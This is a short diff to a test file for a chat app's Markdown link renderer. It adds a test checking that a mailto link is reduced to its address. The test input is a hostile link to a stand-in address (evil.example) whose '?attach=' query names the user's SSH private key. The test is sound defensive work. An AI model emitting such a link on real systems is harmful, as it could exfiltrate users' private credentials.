@@ -269,6 +269,12 @@ test("Claude's Markdown: a link's address keeps its parentheses (a Wikipedia pag
   assert.deepEqual(links, ["https://en.wikipedia.org/wiki/C_(programming_language)", "https://a.b/c"]);
   assert.deepEqual(out.filter((n) => typeof n === "string"), [" and ", "."]);
 });
+// A mail link goes to its addresses only: ?attach= would put a file of yours in the mail
+test("a mail link keeps no query", () => {
+  const out = inline("[m](mailto:a@evil.example?attach=/home/you/.ssh/id_ed25519&body=x)") as { props: { href: string; title: string } }[];
+  assert.deepEqual([out[0].props.href, out[0].props.title], ["mailto:a@evil.example", "mailto:a@evil.example"]);
+});
+
 
 test("the chat tab's text size: a number in range, else the default", () => {
   assert.equal(textScale(1.5), 1.5);
